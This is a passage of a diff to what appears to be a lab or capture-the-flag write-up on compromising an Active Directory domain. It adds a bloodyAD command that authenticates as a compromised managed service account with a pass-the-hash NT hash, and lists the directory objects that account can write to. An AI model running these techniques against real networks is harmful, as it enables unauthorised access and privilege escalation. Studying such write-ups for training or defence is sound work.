@@ -647,5 +647,23 @@ SMB         10.0.31.82      445    DC01             [+] casper.hsm\casper-gmsa$:
 
 This user is now compromised!
 
-# Enumeration 
+# Enumeration as `casper-gmsa$`
+
+```python
+bloodyAD --host dc01.casper.hsm -d casper.hsm -u 'casper-gmsa$' -p ':7abcd8de1d2e107237f8fd5baea13d68' get writable        
+
+distinguishedName: CN=TPM Devices,DC=casper,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=casper,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=carlito,CN=Users,DC=casper,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=casper-gmsa,CN=Managed Service Accounts,DC=casper,DC=hsm
+permission: WRITE
+```
+
+And using the `--detail` flag in bloodyAD tells me i have WRITE on the 
 
